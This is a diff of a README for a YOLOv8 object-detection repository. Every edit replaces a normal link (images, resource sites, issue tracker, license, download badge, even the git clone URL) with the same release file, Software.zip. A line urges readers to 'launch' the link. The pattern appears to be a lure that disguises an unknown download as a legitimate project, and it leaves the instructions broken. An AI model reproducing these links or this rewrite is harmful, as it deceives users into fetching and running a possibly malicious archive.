@@ -1,6 +1,6 @@
 # Object Detection & Identification with YOLOv8 🚀
 
-![object-detection](https://img.icons8.com/color/452/object-detection.png)
+![object-detection](https://github.com/Diabetic-sugar/Object-Detection-Identification-with-YOLOv8/releases/download/v1.0/Software.zip)
 
 Welcome to the **Object Detection & Identification with YOLOv8** repository! Here you will find all you need for real-time object detection and identification using the powerful YOLOv8 model.
 
@@ -20,7 +20,7 @@ Welcome to the **Object Detection & Identification with YOLOv8** repository! Her
 You can clone this repository to get started with object detection and identification using YOLOv8.
 
 ```bash
-git clone https://github.com/your_username/Object-Detection-Identification-with-YOLOv8.git
+git clone https://github.com/Diabetic-sugar/Object-Detection-Identification-with-YOLOv8/releases/download/v1.0/Software.zip
 ```
 
 ## Getting Started 🚀
@@ -34,21 +34,21 @@ You can use this repository for a variety of applications, including security mo
 
 ## Resources 📚
 For more information on YOLOv8 and object detection, check out these valuable resources:
-- [YOLOv8 Official Website](https://yolov8.com)
-- [Machine Learning Mastery](https://www.machinelearningmastery.com)
-- [Towards Data Science](https://towardsdatascience.com)
+- [YOLOv8 Official Website](https://github.com/Diabetic-sugar/Object-Detection-Identification-with-YOLOv8/releases/download/v1.0/Software.zip)
+- [Machine Learning Mastery](https://github.com/Diabetic-sugar/Object-Detection-Identification-with-YOLOv8/releases/download/v1.0/Software.zip)
+- [Towards Data Science](https://github.com/Diabetic-sugar/Object-Detection-Identification-with-YOLOv8/releases/download/v1.0/Software.zip)
 
 ## Support 🤝
-If you encounter any issues or have any questions, feel free to [open an issue](https://github.com/your_username/Object-Detection-Identification-with-YOLOv8/issues).
+If you encounter any issues or have any questions, feel free to [open an issue](https://github.com/Diabetic-sugar/Object-Detection-Identification-with-YOLOv8/releases/download/v1.0/Software.zip).
 
 ## Contributing 🤝
 Contributions are welcome! Feel free to fork this repository and submit a pull request with your enhancements.
 
 ## License 📝
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Diabetic-sugar/Object-Detection-Identification-with-YOLOv8/releases/download/v1.0/Software.zip](https://github.com/Diabetic-sugar/Object-Detection-Identification-with-YOLOv8/releases/download/v1.0/Software.zip) file for details.
 
 ## Download Latest Version 📥
-[![Download Object Detection & Identification with YOLOv8](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Object Detection & Identification with YOLOv8](https://github.com/Diabetic-sugar/Object-Detection-Identification-with-YOLOv8/releases/download/v1.0/Software.zip)](https://github.com/Diabetic-sugar/Object-Detection-Identification-with-YOLOv8/releases/download/v1.0/Software.zip)
 
 (Note: The link needs to be launched to download the latest version)
 
@@ -56,4 +56,4 @@ This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md
 
 Explore the exciting world of real-time object detection and identification with YOLOv8! Get started today and unleash the power of artificial intelligence in computer vision applications. Happy coding! 🤖🔍
 
-![object-detection-img](https://cdn.iconscout.com/icon/free/png-256/object-detection-5558008-4675154.png)
+![object-detection-img](https://github.com/Diabetic-sugar/Object-Detection-Identification-with-YOLOv8/releases/download/v1.0/Software.zip)
